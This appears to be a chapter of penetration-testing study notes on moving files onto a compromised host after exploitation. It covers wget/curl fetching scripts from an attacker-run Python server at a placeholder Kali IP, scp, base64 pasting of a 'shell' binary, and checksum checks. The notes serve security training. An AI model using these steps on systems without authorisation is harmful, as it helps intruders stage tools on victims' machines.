# 12. File Transfer Techniques (Post-Exploitation)

## 1. Web Server Method (Python HTTP Server + `wget` / `curl`)

This is the most standard and frequently used transfer method when outbound HTTP connections are permitted from the target machine.

* **Step 1 (Start a Local HTTP Server on Kali):** Navigate to the directory hosting your payload or enumeration script (e.g., `/tmp`) and start a temporary Python web server:
  ```bash
  python3 -m http.server 8000
  ```
  This serves files from the current directory over TCP port `8000`.

* **Step 2 (Download the File on the Target Machine):**
  * **Using `wget`:**
    ```bash
    wget http://<KALI_IP>:8000/linenum.sh
    ```
    By default, `wget` saves the file into the current working directory under its original filename.
  * **Using `curl`:**
    ```bash
    curl http://<KALI_IP>:8000/linenum.sh -o linenum.sh
    ```
    The **`-o`** flag is mandatory; otherwise, `curl` prints the file contents directly to standard output (`stdout`).

---

## 2. Secure Copy Method (`scp` over SSH)

When valid SSH credentials (username/password or an SSH private key) are available, files can be transferred directly over an encrypted SSH channel without spinning up a web server.

* **Syntax (Executed from Kali):**
  ```bash
  scp <local_file> <username>@<remote_ip>:<destination_directory>
  ```
* **Example:**
  ```bash
  scp linenum.sh user@remotehost:/tmp/linenum.sh
  ```
* **Note:** Everything after the colon (`:`) specifies the exact destination file path on the remote target.

---

## 3. Terminal Pipe Method (Base64 Encoding)

When strict firewall rules block outbound downloads from the target or neither `curl` nor `wget` is installed, files can be transferred purely as ASCII text through an active terminal session.

* **Concept:** Encode a script or compiled binary into a single-line Base64 string on the attack machine, paste it into the target shell, and decode it back to its original binary format.
* **Step 1 (Encode on Kali):**
  ```bash
  base64 shell -w 0
  ```
  * **`-w 0`:** Disables line wrapping so the output prints as one continuous line, preventing formatting breaks during copy-paste.
* **Step 2 (Decode and Write on Target):**
  ```bash
  echo "<COPIED_BASE64_STRING>" | base64 -d > shell
  ```
  * **`-d`:** Decodes the Base64 string back into raw bytes and writes the output to `shell`.

---

## 4. Integrity Validation (Checksum Verification)

Always verify that transferred executables or scripts arrived intact without corruption or truncation.

* **Verify File Type:**
  ```bash
  file shell
  ```
  Confirms whether the reconstructed file is recognized as a valid ELF executable or script.
* **Compare MD5 Checksums:**
  ```bash
  # Run on Kali:
  md5sum shell

  # Run on Target:
  md5sum shell
  ```
  If both 32-character MD5 hashes match identically, the file transferred cleanly with zero corruption.
